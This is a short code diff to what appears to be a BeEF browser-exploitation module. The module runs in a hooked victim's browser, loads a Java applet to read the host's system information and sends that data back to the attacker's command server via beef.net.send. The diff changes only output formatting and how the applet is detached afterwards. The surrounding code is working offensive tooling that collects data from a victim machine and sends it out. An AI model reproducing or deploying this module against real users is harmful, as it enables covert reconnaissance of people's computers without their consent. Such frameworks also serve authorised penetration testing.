@@ -22,21 +22,22 @@ beef.execute(function() {
 	if (beef.browser.isFF()) {
 
 		output = document.getSystemInfo.getInfo();
-		if (output) beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br />"));
+		if (output) beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
+		beef.dom.detachApplet('getSystemInfo');
 
 	} else {
 
 		function waituntilok() {
 			try {
 				output = document.getSystemInfo.getInfo();
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br />"));
-				$j('#getSystemInfo').detach();
+				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
+				beef.dom.detachApplet('getSystemInfo');
 				return;
 			} catch (e) {
 				internal_counter++;
 				if (internal_counter > 30) {
 					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after 20 seconds');
-					$j('#getSystemInfo').detach();
+					beef.dom.detachApplet('getSystemInfo');
 					return;
 				}
 				setTimeout(function() {waituntilok()},1000);
